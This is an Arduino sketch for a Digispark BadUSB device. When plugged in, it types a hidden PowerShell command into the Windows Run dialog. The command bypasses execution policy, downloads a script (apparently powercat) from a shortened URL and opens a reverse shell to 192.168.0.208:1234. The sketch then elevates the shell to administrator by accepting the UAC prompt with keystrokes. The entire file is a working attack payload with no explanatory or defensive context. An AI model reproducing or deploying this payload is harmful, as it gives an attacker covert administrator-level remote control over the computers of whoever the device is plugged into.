#include "DigiKeyboard.h"

void setup() {
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    DigiKeyboard.delay(600);
    DigiKeyboard.print("powershell /w 1 /C $a=$env:TEMP;Set-ExecutionPolicy Bypass;wget https://cutt.ly/cW13i -o $a\d.ps1;ipmo $a\d.ps1;powercat -c 192.168.0.208 -p 1234 -e powershell");
    DigiKeyboard.sendKeyStroke(MOD_CONTROL_LEFT, MOD_SHIFT_LEFT, KEY_ENTER);
    DigiKeyboard.delay(800);
    DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT, KEY_Y);
    DigiKeyboard.delay(200);
}

void loop() {
}